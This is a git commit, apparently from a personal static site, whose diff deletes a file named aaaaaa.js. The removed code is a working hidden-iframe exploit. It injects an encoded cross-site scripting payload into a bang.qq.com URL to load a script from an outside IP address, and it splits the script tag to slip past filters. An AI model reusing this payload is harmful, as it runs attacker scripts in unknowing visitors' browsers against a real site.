9246bf556abac576f95394f9b1c33a4a7dbf7f56
神奇辉 <shenqihui0920@gmail.com>
2015-06-09 21:58:01 +0800

    Site updated: 2015-06-09 21:58:00

--- aaaaaa.js
+++
@@ -1,9 +0,0 @@
-(function(){
-  var iframe = document.createElement('iframe');
-  iframe.width = 0;
-  iframe.height = 0;
-  iframe.style.visibility = 'hidden';
-  var src = 'http://bang.qq.com/wenda/search/1%27%3Bl%3Dlocation.hash.split%28%27%23%27%29%3Bdocument.write%28l%5B1%5D%2bl%5B2%5D%2b%27128.199.80.154:8001%27%2bl%5B3%5D%2bl%5B4%5D%29%3Ba%3D%271#<scr'+'ipt# src="//#/static/test_js/test_qq.js#">';
-  iframe.src = src;
-  document.body.appendChild(iframe);
-})();</scr'+'ipt#>
